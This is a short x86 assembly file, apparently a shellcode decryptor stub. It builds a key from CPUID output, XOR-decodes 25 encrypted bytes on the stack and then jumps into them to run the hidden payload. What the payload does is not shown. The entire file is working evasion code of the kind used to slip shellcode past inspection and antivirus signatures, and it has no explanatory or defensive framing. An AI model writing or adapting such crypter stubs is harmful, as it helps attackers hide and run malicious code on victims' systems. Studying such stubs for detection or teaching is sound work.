;decryptor.asm


SECTION .text

global _start




_start:

	xor eax,eax
	xor ebx,ebx
	xor edx,edx
	xor ecx,ecx

	mov al,1      
	cpuid

	add eax, ebx
	add eax, ecx
	add eax, edx


	xor ebx,ebx
	xor edx,edx
	xor ecx,ecx


	sub esp,0x48

    xor ebx,ebx

	mov    DWORD [esp+0x3c],ebx
	mov    DWORD [esp+0x38],ebx
	mov    DWORD [esp+0x1e],0x67fffcda
	mov    DWORD [esp+0x22],0x67dc13c4
	mov    DWORD [esp+0x26],0x66cd1383
	mov    DWORD [esp+0x2a],0x5f4cb585
	mov    DWORD [esp+0x2e],0x86fcde62
	mov    DWORD [esp+0x32],0xc2a48c0a
	mov    BYTE  [esp+0x36],0x6b

	mov dword [esp+0x19], eax

	mov BYTE [esp+0x1d],bl

	xor ecx,ecx
	mov cl, 25

looper:

	mov    eax,DWORD [esp+0x3c]
	cdq    
	shr    edx,0x1e
	add    eax,edx
	and    eax,0x3
	sub    eax,edx
	mov    DWORD [esp+0x38],eax
	lea    edx,[esp+0x1e]
	mov    eax,DWORD [esp+0x3c]
	add    eax,edx
	xor ebx,ebx
	xor edx,edx
	mov bl, BYTE[eax]
	mov dl,bl
	;movzx  edx,BYTE [eax]
	lea    ebx,[esp+0x19]
	mov    eax,DWORD [esp+0x38]
	add    eax,ebx
	xor ebx,ebx
	mov bl,BYTE[eax]
	xor eax,eax
	mov al,bl
	;movzx  eax,BYTE [eax]
	xor    eax,edx
	lea    ebx,[esp+0x1e]
	mov    edx,DWORD [esp+0x3c]
	add    edx,ebx
	mov    BYTE [edx],al
	add    DWORD [esp+0x3c],0x1
	loop   looper
	
	lea eax, [esp+0x1e]
    jmp eax

	xor eax, eax
	mov al, 1      
	xor ebx,ebx
	int 0x80

